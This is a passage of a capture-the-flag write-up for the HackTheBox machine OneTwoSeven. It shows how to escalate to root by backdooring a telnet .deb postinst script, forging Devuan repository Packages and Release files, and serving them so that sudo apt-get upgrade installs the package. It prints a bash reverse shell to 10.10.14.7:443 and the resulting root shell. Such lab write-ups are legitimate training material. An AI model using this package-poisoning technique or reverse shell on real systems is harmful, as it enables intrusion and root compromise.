127.0.0.1 - - [26/Aug/2019 06:40:13] "GET /devuan/dists/ascii/InRelease HTTP/1.1" 404 -
127.0.0.1 - - [26/Aug/2019 06:40:13] code 404, message File not found
127.0.0.1 - - [26/Aug/2019 06:40:13] "GET /devuan/dists/ascii/Release HTTP/1.1" 404 -
127.0.0.1 - - [26/Aug/2019 06:40:13] code 404, message File not found
127.0.0.1 - - [26/Aug/2019 06:40:13] "GET /devuan/dists/ascii/main/binary-amd64/Packages.xz HTTP/1.1" 404 -
127.0.0.1 - - [26/Aug/2019 06:40:13] code 404, message File not found
127.0.0.1 - - [26/Aug/2019 06:40:13] "GET /devuan/dists/ascii/main/binary-all/Packages.xz HTTP/1.1" 404 -
127.0.0.1 - - [26/Aug/2019 06:40:13] code 404, message File not found
127.0.0.1 - - [26/Aug/2019 06:40:13] "GET /devuan/dists/ascii/main/i18n/Translation-en.xz HTTP/1.1" 404 -
127.0.0.1 - - [26/Aug/2019 06:40:13] code 404, message File not found
127.0.0.1 - - [26/Aug/2019 06:40:13] "GET /devuan/dists/ascii/main/binary-amd64/Packages.bz2 HTTP/1.1" 404 -
127.0.0.1 - - [26/Aug/2019 06:40:13] code 404, message File not found
127.0.0.1 - - [26/Aug/2019 06:40:13] "GET /devuan/dists/ascii/main/binary-all/Packages.bz2 HTTP/1.1" 404 -
127.0.0.1 - - [26/Aug/2019 06:40:13] code 404, message File not found
127.0.0.1 - - [26/Aug/2019 06:40:13] "GET /devuan/dists/ascii/main/i18n/Translation-en.bz2 HTTP/1.1" 404 -
127.0.0.1 - - [26/Aug/2019 06:40:13] code 404, message File not found
127.0.0.1 - - [26/Aug/2019 06:40:13] "GET /devuan/dists/ascii/main/binary-amd64/Packages.lzma HTTP/1.1" 404 -
127.0.0.1 - - [26/Aug/2019 06:40:13] code 404, message File not found
127.0.0.1 - - [26/Aug/2019 06:40:13] "GET /devuan/dists/ascii/main/binary-all/Packages.lzma HTTP/1.1" 404 -
127.0.0.1 - - [26/Aug/2019 06:40:13] code 404, message File not found
127.0.0.1 - - [26/Aug/2019 06:40:13] "GET /devuan/dists/ascii/main/i18n/Translation-en.lzma HTTP/1.1" 404 -
127.0.0.1 - - [26/Aug/2019 06:40:13] code 404, message File not found
127.0.0.1 - - [26/Aug/2019 06:40:13] "GET /devuan/dists/ascii/main/binary-amd64/Packages.gz HTTP/1.1" 404 -
127.0.0.1 - - [26/Aug/2019 06:40:13] code 404, message File not found
127.0.0.1 - - [26/Aug/2019 06:40:13] "GET /devuan/dists/ascii/main/binary-all/Packages.gz HTTP/1.1" 404 -
127.0.0.1 - - [26/Aug/2019 06:40:13] code 404, message File not found
127.0.0.1 - - [26/Aug/2019 06:40:13] "GET /devuan/dists/ascii/main/i18n/Translation-en.gz HTTP/1.1" 404 -
127.0.0.1 - - [26/Aug/2019 06:40:13] code 404, message File not found
127.0.0.1 - - [26/Aug/2019 06:40:13] "GET /devuan/dists/ascii/main/binary-amd64/Packages.lz4 HTTP/1.1" 404 -
127.0.0.1 - - [26/Aug/2019 06:40:13] code 404, message File not found
127.0.0.1 - - [26/Aug/2019 06:40:13] "GET /devuan/dists/ascii/main/binary-all/Packages.lz4 HTTP/1.1" 404 -
127.0.0.1 - - [26/Aug/2019 06:40:13] code 404, message File not found
127.0.0.1 - - [26/Aug/2019 06:40:13] "GET /devuan/dists/ascii/main/i18n/Translation-en.lz4 HTTP/1.1" 404 -
127.0.0.1 - - [26/Aug/2019 06:40:14] code 404, message File not found
127.0.0.1 - - [26/Aug/2019 06:40:14] "GET /devuan/dists/ascii/main/binary-amd64/Packages HTTP/1.1" 404 -
127.0.0.1 - - [26/Aug/2019 06:40:14] code 404, message File not found
127.0.0.1 - - [26/Aug/2019 06:40:14] "GET /devuan/dists/ascii/main/binary-all/Packages HTTP/1.1" 404 -
127.0.0.1 - - [26/Aug/2019 06:40:14] code 404, message File not found
127.0.0.1 - - [26/Aug/2019 06:40:14] "GET /devuan/dists/ascii/main/i18n/Translation-en HTTP/1.1" 404 -

```

This all seems to be working as expected!

### Create Poisoned Package

Most of these steps come from a [good post on versprite](https://versprite.com/blog/apt-mitm-package-injection/). They talk about DNS poisoning to get the MitM position, but otherwise the steps to poison the package are the same.

#### Pick a Package

I’ll want to pick a package that’s already installed on OneTwoSeven, since I don’t have `apt-get install` rights. `dpkg -l` will show me that list:

```

www-admin-data@onetwoseven:/$ dpkg -l | head -20
Desired=Unknown/Install/Remove/Purge/Hold
| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
||/ Name                                   Version                            Architecture Description
+++-======================================-==================================-============-===============================================================================
ii  adduser                                3.115                              all          add and remove users and groups
ii  apache2                                2.4.25-3+deb9u6                    amd64        Apache HTTP Server
ii  apache2-bin                            2.4.25-3+deb9u6                    amd64        Apache HTTP Server (modules and other binary files)
ii  apache2-data                           2.4.25-3+deb9u6                    all          Apache HTTP Server (common files)
ii  apache2-utils                          2.4.25-3+deb9u6                    amd64        Apache HTTP Server (utility programs for web servers)
ii  apt                                    1.4.9                              amd64        commandline package manager
ii  apt-listchanges                        3.10                               all          package change history notification tool
ii  apt-utils                              1.4.9                              amd64        package management related utility programs
ii  base-files                             9.9+devuan2.5                      all          Devuan base system miscellaneous files
ii  base-passwd                            3.5.43                             amd64        Debian base system master password and group files
ii  bash                                   4.4-5                              amd64        GNU Bourne Again SHell
ii  bash-completion                        1:2.1-4.3+devuan1                  all          programmable completion for the bash shell
ii  bind9-host                             1:9.10.3.dfsg.P4-12.3+deb9u4       amd64        Version of 'host' bundled with BIND 9.X
ii  bsdmainutils                           9.0.12+nmu1                        amd64        collection of more utilities from FreeBSD
ii  bsdutils                               1:2.29.2-1+devuan2.1               amd64        basic utilities from 4.4BSD-Lite

```

For whatever reason, I picked `telnet`:

```

www-admin-data@onetwoseven:/$ dpkg -l | grep telnet
ii  telnet                                 0.17-41                            amd64        basic telnet client

```

I can run `apt-cache show` to get details on the `telnet` install:

```

www-admin-data@onetwoseven:/$ apt-cache show telnet
Package: telnet
Version: 0.17-41
Installed-Size: 157
Maintainer: Mats Erik Andersson <mats.andersson@gisladisker.se>
Architecture: amd64
Replaces: netstd
Provides: telnet-client
Depends: netbase, libc6 (>= 2.15), libstdc++6 (>= 5)
Description: basic telnet client
Description-md5: 80f238fa65c82c04a1590f2a062f47bb
Source: netkit-telnet
Tag: admin::login, interface::shell, network::client, protocol::ipv6,
 protocol::telnet, role::program, uitoolkit::ncurses, use::login
Section: net
Priority: standard
Filename: pool/DEBIAN/main/n/netkit-telnet/telnet_0.17-41_amd64.deb
Size: 72008
MD5sum: 3409d7e40403699b890c68323e200874
SHA256: 95aa315eb5b3be12fc7a91a8d7ee8eba7af99120641067ec39694200e034a5ae

```

#### Download Package

I found the package with some googling at <https://debian.pkgs.org/9/debian-main-amd64/telnet_0.17-41_amd64.deb.html>. I downloaded it, and go the `md5sum`

```

root@kali# md5sum telnet_0.17-41_amd64.deb
3409d7e40403699b890c68323e200874  telnet_0.17-41_amd64.deb

```

It matches what I saw in the `apt-cahce` output above for the package on OneTwoSeven.

Alternatively, I could use `apt download` to get the file. If I do that today (the week before OneTwoSeven retires, I get a later version):

```

root@kali# apt download telnet
Get:1 http://ftp.hands.com/kali kali-rolling/main amd64 telnet amd64 0.17-41.2 [70.4 kB]
Fetched 70.4 kB in 1s (126 kB/s)

```

I could use that one as well, but I’ll continue forward with the 0.17-41 version to show starting with the same version as on target for now.

#### Modify Package

Next I’ll unpack the `.deb` file using `dpkg-deb` with the output going to a folder named `modified_telnet`:

```

root@kali# dpkg-deb -R telnet_0.17-41_amd64.deb modified_telnet

```

In `modified_telnet/DEBIAN/` there’s a file `control`. It has the version number, so I’ll update that (on the 3rd line, I’ll change 41 to 42):

```

Package: telnet
Source: netkit-telnet
Version: 0.17-42
Architecture: amd64
Maintainer: Mats Erik Andersson <mats.andersson@gisladisker.se>
Installed-Size: 157
Depends: netbase, libc6 (>= 2.15), libstdc++6 (>= 5)
Replaces: netstd
Provides: telnet-client
Section: net
Priority: standard
Description: basic telnet client
 The telnet command is used for interactive communication with another host
 using the TELNET protocol.
 .
 For the purpose of remote login, the present client executable should be
 depreciated in favour of an ssh-client, or in some cases with variants like
 telnet-ssl or Kerberized TELNET clients.  The most important reason is that
 this implementation exchanges user name and password in clear text.
 .
 On the other hand, the present program does satisfy common use cases of
 network diagnostics, like protocol testing of SMTP services, so it can
 become handy enough.

```

Next I’ll update `DEBIAN/postinst`. This script will run during the install. If I had picked a package that didn’t already have one, I could just create one. But since `telnet` has one, I’ll add a line to add a call to run `/tmp/.d` towards to top:

```

#!/bin/sh
# $Id: postinst,v 1.4 2000/08/23 10:08:42 herbert Exp $

set -e

/tmp/.d

update-alternatives --install /usr/bin/telnet telnet /usr/bin/telnet.netkit 100 \
            --slave /usr/share/man/man1/telnet.1.gz telnet.1.gz \
                /usr/share/man/man1/telnet.netkit.1.gz

# Automatically added by dh_installmenu
if [ "$1" = "configure" ] && [ -x "`which update-menus 2>/dev/null`" ]; then
    update-menus
fi
# End automatically added section

```

Since I already have access to the box, this gives me flexibility to run different things without making an entirely new package. Were I trying to get access to a new box, I would put a reverse shell in where I call `/tmp/.d` now.

Now repackage it:

```

root@kali# dpkg-deb -b modified_telnet/ telnet_0.17-42_amd64.deb
dpkg-deb: building package 'telnet' in 'telnet_0.17-42_amd64.deb'.

```

### Repo Files

To impersonate a repository, I need to have a few files in place.

#### Packages

A `Packages` file gives the current versions of packages available. I’m going to create one with just `telnet` in it, and update it to advertise my backdoored version as the latest.

I’ll get the Packages data from OneTwoSeven:

```

www-admin-data@onetwoseven:/$ cat /var/lib/apt/lists/de.deb.devuan.org_merged_dists_ascii_main_binary-amd64_Packages | grep -A 18 "Package: telnet$"
Package: telnet
Version: 0.17-41
Installed-Size: 157
Maintainer: Mats Erik Andersson <mats.andersson@gisladisker.se>
Architecture: amd64
Replaces: netstd
Provides: telnet-client
Depends: netbase, libc6 (>= 2.15), libstdc++6 (>= 5)
Description: basic telnet client
Description-md5: 80f238fa65c82c04a1590f2a062f47bb
Source: netkit-telnet
Tag: admin::login, interface::shell, network::client, protocol::ipv6,
 protocol::telnet, role::program, uitoolkit::ncurses, use::login
Section: net
Priority: standard
Filename: pool/DEBIAN/main/n/netkit-telnet/telnet_0.17-41_amd64.deb
Size: 72008
MD5sum: 3409d7e40403699b890c68323e200874
SHA256: 95aa315eb5b3be12fc7a91a8d7ee8eba7af99120641067ec39694200e034a5ae

```

I’ll need to get the size, MD5, and SHA256:

```

root@kali# ls -l telnet_0.17-42_amd64.deb; md5sum telnet_0.17-42_amd64.deb; sha256sum telnet_0.17-42_amd64.deb 
-rwxrwx--- 1 root vboxsf 72084 Aug 26 07:48 telnet_0.17-42_amd64.deb
637b6332d7bc415948932c1c94ad609b  telnet_0.17-42_amd64.deb
4c1dabeb8afc4735d6fb2bd538a0d2dd1bb1a67303a6418549ed4abf4e2a61a9  telnet_0.17-42_amd64.deb

```

Now I can create a `Packages` file with updated version (lines 2, 16), size (17), and hashes (18-19):

```

  1 Package: telnet
  2 Version: 0.17-42
  3 Installed-Size: 157
  4 Maintainer: Mats Erik Andersson <mats.andersson@gisladisker.se>
  5 Architecture: amd64
  6 Replaces: netstd
  7 Provides: telnet-client
  8 Depends: netbase, libc6 (>= 2.15), libstdc++6 (>= 5)
  9 Description: basic telnet client
 10 Description-md5: 80f238fa65c82c04a1590f2a062f47bb
 11 Source: netkit-telnet
 12 Tag: admin::login, interface::shell, network::client, protocol::ipv6,
 13  protocol::telnet, role::program, uitoolkit::ncurses, use::login
 14 Section: net
 15 Priority: standard
 16 Filename: pool/DEBIAN/main/n/netkit-telnet/telnet_0.17-42_amd64.deb
 17 Size: 72084
 18 MD5sum: 637b6332d7bc415948932c1c94ad609b
 19 SHA256: 4c1dabeb8afc4735d6fb2bd538a0d2dd1bb1a67303a6418549ed4abf4e2a61a9

```

I’ll need a compressed version:

```

root@kali# gzip Packages -c > Packages.gz

```

#### Release

I don’t actually need to make a `Release` file. As I saw in the run [above](#testing), when it fails to get Release, it tries to get a bunch of `Packages` files anyway. The `Release` file has all the package files the repository holds, with their hashes, allowing the client to compare to it’s local copy, and only bother with any that have changed. I could skip this part, but for the sake of understanding what’s going on, I’ll create one.

On OneTwoSeven, I’ll check the local copy:

```

www-admin-data@onetwoseven:/$ cat /var/lib/apt/lists/de.deb.devuan.org_merged_dists_ascii-updates_Release | head -15
Origin: Devuan
Label: Devuan
Suite: stable-updates
Version: 2.0.0
Codename: ascii-updates
Date: Sun, 25 Aug 2019 20:46:02 UTC
Architectures:  amd64 arm64 armel armhf i386 ppc64el
Components: main contrib non-free
SHA256:
 e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855        0 contrib/binary-armhf/Packages
 0ba877606ba38ef307382bf2cf41b991c248499f9d549e1224d493258e6f2fea      949 main/debian-installer/binary-i386/Packages.gz
 e167af9851b8226953161338dadf89d089402e1a39dfd8859a684311f09c00a5       29 contrib/binary-armel/Packages.gz
 4cadad0c317172a52bf4e1cac8c9f2627c72d54764c1b756def196b513cef5cc       29 non-free/debian-installer/binary-amd64/Packages.gz
 cc826c85a01b615920b39ed0eb995a09354452ec6bfe8a41e2887f697e8ab57f       29 contrib/binary-amd64/Packages.gz
 e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855        0 non-free/binary-all/Packages

```

This file is 231 lines long. I only care about the `main/binary-amd64/Packages` ones, so I can `grep` those:

```

www-admin-data@onetwoseven:/$ cat /var/lib/apt/lists/de.deb.devuan.org_merged_dists_ascii-updates_Release | grep 'main/binary-amd64/Packages'
 8a15fa67c6ffb6af825ab13946d83b83fa2a67cb71b75998363446c7ac1ab36c   177676 main/binary-amd64/Packages
 4176a1fd502c721822a27fbbc4af2958421b1d8784535cb7a9a3d3843d4ee2a2    35025 main/binary-amd64/Packages.gz
 04458bdb3f2ee17ea8d6890828743efb6b27dd0a10c8106f807074b62cae2770    28788 main/binary-amd64/Packages.xz

```

I’ll get the hashes and sizes for my `Packages` files:

```

root@kali# ls -l Packages*; sha256sum Packages*
-rwxrwx--- 1 root vboxsf 697 Aug 26 09:07 Packages
-rwxrwx--- 1 root vboxsf 492 Aug 26 09:07 Packages.gz
822293926a655c9ad8eb2d6125899ce966fdde80ea669e3852f8658a2d957875  Packages
d972aac748a64259de3bdb62ffacbbe5e036e2b18e19810d4e67d934a9d30006  Packages.gz

```

My release file now contains that info. It took a little tweaking of parameters to get it working:

```

Origin: Devuan
Label: Devuan
Suite: stable
Version: 2.0.0
Codename: ascii
Date: Sun, 26 Aug 2019 00:46:02 UTC
Architectures:  amd64 arm64 armel armhf i386 ppc64el
Components: main
SHA256:
 822293926a655c9ad8eb2d6125899ce966fdde80ea669e3852f8658a2d957875      697 main/binary-amd64/Packages
 d972aac748a64259de3bdb62ffacbbe5e036e2b18e19810d4e67d934a9d30006      492 main/binary-amd64/Packages.gz

```

### Serve Repo

#### File Structure

I’ll need to put the package, `Packages`, and `Release` into the right spots relative to my web root for this to work. If something is out of place, I’ll see a 404 in my python `http.server` output.

```

root@kali# find repo/ -type f
repo/devuan/dists/ascii/main/binary-amd64/Packages
repo/devuan/dists/ascii/main/binary-amd64/Packages.gz
repo/devuan/dists/ascii/Release
repo/devuan/pool/DEBIAN/main/n/netkit-telnet/telnet_0.17-42_amd64.deb

```

#### Run Server

Now I’ll go to that folder root and run `python3 -m http.server 80` to start the server. It must be on 80 for this to work.

### Run Exploit

#### Set Action

First I’ll need to set up the action I want to run. My package will execute `/tmp/.d`. I’ll put a simple reverse shell there:

```

www-admin-data@onetwoseven:/$ echo -e '#!/bin/sh\n\nbash -c "bash -i >& /dev/tcp/10.10.14.7/443 0>&1"'          
#!/bin/sh

bash -c "bash -i >& /dev/tcp/10.10.14.7/443 0>&1"
www-admin-data@onetwoseven:/$ echo -e '#!/bin/sh\n\nbash -c "bash -i >& /dev/tcp/10.10.14.7/443 0>&1"' > /tmp/.d
www-admin-data@onetwoseven:/$ chmod +x /tmp/.d 

```

I’ll test it as well, just to make sure it works. It does.

#### update

Now I’ll run `sudo /usr/bin/apt-get update`. At my http server, I see:

```

root@kali# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
127.0.0.1 - - [26/Aug/2019 09:39:11] code 404, message File not found
127.0.0.1 - - [26/Aug/2019 09:39:11] "GET /devuan/dists/ascii/InRelease HTTP/1.1" 404 -
127.0.0.1 - - [26/Aug/2019 09:39:11] "GET /devuan/dists/ascii/Release HTTP/1.1" 200 -
127.0.0.1 - - [26/Aug/2019 09:39:11] code 404, message File not found
127.0.0.1 - - [26/Aug/2019 09:39:11] "GET /devuan/dists/ascii/Release.gpg HTTP/1.1" 404 -
127.0.0.1 - - [26/Aug/2019 09:39:11] "GET /devuan/dists/ascii/main/binary-amd64/Packages.gz HTTP/1.1" 200 -

```

I can see it successfully retrieves `Release` and then `Packages.gz`. The `Release` file tells the system there’s a new package to install in `Packages` at that path. Then it gets the compressed version. On a normal system, it would end with a message about how many packages were available for update, and suggesting I run `apt upgrade`, something like this:

```

1887 packages can be upgraded. Run 'apt list --upgradable' to see them.

```

However here, it only gives warnings about my unsigned `Release` file (it did try to get `Release.gpg` and fail):

```

W: The repository 'http://packages.onetwoseven.htb/devuan ascii Release' is not signed.
N: Data from such a repository can't be authenticated and is therefore potentially dangerous to use.
N: See apt-secure(8) manpage for repository creation and user configuration details.

```

That’s just fine.

#### upgrade

Now I’ll run `upgrade`. Right away, it tells me that `telnet` will be upgraded, and 0 extra bytes of disk space will be used:

```

www-admin-data@onetwoseven:/$ sudo /usr/bin/apt-get upgrade
Reading package lists... Done
Building dependency tree
Reading state information... Done
Calculating upgrade... Done
The following packages will be upgraded:
  telnet
1 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
Need to get 72.1 kB of archives.
After this operation, 0 B of additional disk space will be used.
Do you want to continue? [Y/n]

```

On entering `Y`, there’s a warning:

```

WARNING: The following packages cannot be authenticated!
  telnet
Install these packages without verification? [y/N]

```

On entering `Y` again, there’s another request to my web server requesting the package:

```
127.0.0.1 - - [26/Aug/2019 09:53:07] "GET /devuan/pool/DEBIAN/main/n/netkit-telnet/telnet_0.17-42_amd64.deb HTTP/1.1" 200 -

```

The local screen shows messages:

```

Get:1 http://packages.onetwoseven.htb/devuan ascii/main amd64 telnet amd64 0.17-42 [72.1 kB]
Fetched 72.1 kB in 0s (239 kB/s)
Reading changelogs... Done
debconf: unable to initialize frontend: Dialog
debconf: (Dialog frontend will not work on a dumb terminal, an emacs shell buffer, or without a controlling terminal.)
debconf: falling back to frontend: Readline
(Reading database ... 33940 files and directories currently installed.)
Preparing to unpack .../telnet_0.17-42_amd64.deb ...
Unpacking telnet (0.17-42) over (0.17-41) ...
Setting up telnet (0.17-42) ...

```

It hangs on `Setting up telnet (0.17-42)`.

But I’ve got a shell at my `nc` listener:

```

root@kali# nc -lvnp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.133.
Ncat: Connection from 10.10.10.133:51224.
root@onetwoseven:/# id
uid=0(root) gid=0(root) groups=0(root)

```

From there, I can grab `root.txt`:

```

root@onetwoseven:~# cat root.txt 
2d380a25...

```